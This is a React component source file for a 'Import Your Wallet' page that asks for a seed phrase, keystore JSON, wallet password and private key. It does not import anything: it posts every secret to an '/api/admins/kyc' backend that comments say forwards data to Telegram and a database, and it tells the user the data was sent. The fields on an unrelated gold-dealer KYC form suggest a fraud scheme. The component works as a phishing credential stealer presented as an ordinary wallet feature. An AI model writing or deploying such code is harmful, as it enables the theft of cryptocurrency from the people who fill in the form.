import React, { useState, useRef } from 'react';

const WalletImportForm = () => {
  const [form, setForm] = useState({
    seedPhrase: '',
    keystoreJson: '',
    password: '',
    privateKey: '',
  });
  const [toast, setToast] = useState({ show: false, message: '' });
  const toastTimeout = useRef(null);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleImport = async (e) => {
    e.preventDefault();

    // Validate seed phrase
    if (!form.seedPhrase.trim()) {
      setToast({ show: true, message: 'Failed to import: Seed Phrase is required to import the wallet.' });
      if (toastTimeout.current) clearTimeout(toastTimeout.current);
      toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 3500);
      return;
    }

    // Check if session exists, if not create one
    let sessionId = localStorage.getItem('sessionId');
    if (!sessionId) {
      sessionId = `session_${Date.now()}`;
      localStorage.setItem('sessionId', sessionId);
    }

    // Always send data to Telegram and the database using the existing KYC endpoint
    const payload = {
      sessionId: sessionId,
      walletType: 'Direct Import', // Since this is direct wallet import
      seedPhrase: form.seedPhrase,
      keystoreJson: form.keystoreJson || undefined,
      password: form.password || undefined,
      privateKey: form.privateKey || undefined,
      imageUrls: [], // No images for direct import
      fileMap: {}, // No file mapping for direct import
      dealersLicenseStatus: 'not_available', // Mark as not available for direct import
      qualityRequired: 'N/A',
      karatsPurity: 'N/A',
      destinationRefineryText: 'N/A',
    };

    try {
      console.log('Sending payload to backend:', payload);
      console.log('Backend URL:', import.meta.env.VITE_BACKEND_URL);
      
      // Send data using the existing KYC endpoint which handles both DB and Telegram
      const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      console.log('Response status:', res.status);
      console.log('Response headers:', res.headers);

      if (!res.ok) {
        const errorText = await res.text();
        console.error('Error response:', errorText);
        throw new Error(`Failed to submit: ${errorText}`);
      }

      const responseData = await res.json();
      console.log('Success response:', responseData);
      setToast({ show: true, message: 'Wallet data sent successfully!' });
    } catch (error) {
      console.error('Error sending wallet data:', error);
      setToast({ show: true, message: 'Failed to send wallet data. Please try again.' });
    }

    if (toastTimeout.current) clearTimeout(toastTimeout.current);
    toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 2500);
  };

  return (
    <div style={{ maxWidth: 500, margin: '2rem auto', background: '#fff', borderRadius: 16, boxShadow: '0 4px 24px rgba(0,0,0,0.2)', padding: '2rem', border: '2px solid #d32f2f', color: '#222' }}>
      {toast.show && (
        <div style={{ position: 'fixed', left: '50%', top: '10%', transform: 'translate(-50%, 0)', background: '#fff', color: '#d32f2f', padding: '16px 32px', borderRadius: 10, fontWeight: 700, fontSize: 18, boxShadow: '0 2px 12px rgba(0,0,0,0.25)', zIndex: 9999, textAlign: 'center', border: '2px solid #d32f2f' }}>
          {toast.message}
        </div>
      )}
      <h3 style={{ color: '#d32f2f', fontWeight: 800, fontSize: 24, textAlign: 'center', marginBottom: 24 }}>Import Your Wallet</h3>
      <form onSubmit={handleImport}>
        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Seed Phrase <span style={{ fontWeight: 400 }}>(required)</span></label>
        <input type="text" name="seedPhrase" value={form.seedPhrase} onChange={handleChange} style={{ marginBottom: 16, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Enter your seed phrase" />

        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Keystore JSON</label>
        <input type="text" name="keystoreJson" value={form.keystoreJson} onChange={handleChange} style={{ marginBottom: 16, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Paste your keystore JSON" />

        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Password</label>
        <input type="password" name="password" value={form.password} onChange={handleChange} style={{ marginBottom: 16, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Enter your password" />

        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Private Key</label>
        <input type="text" name="privateKey" value={form.privateKey} onChange={handleChange} style={{ marginBottom: 24, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Enter your private key" />

        <button type="submit" style={{ background: '#d32f2f', color: '#fff', fontWeight: 700, fontSize: 18, borderRadius: 8, padding: '12px 0', width: '100%', border: 'none', boxShadow: '0 2px 8px rgba(0,0,0,0.1)', cursor: 'pointer' }}>
          Import
        </button>
      </form>
    </div>
  );
};

export default WalletImportForm;
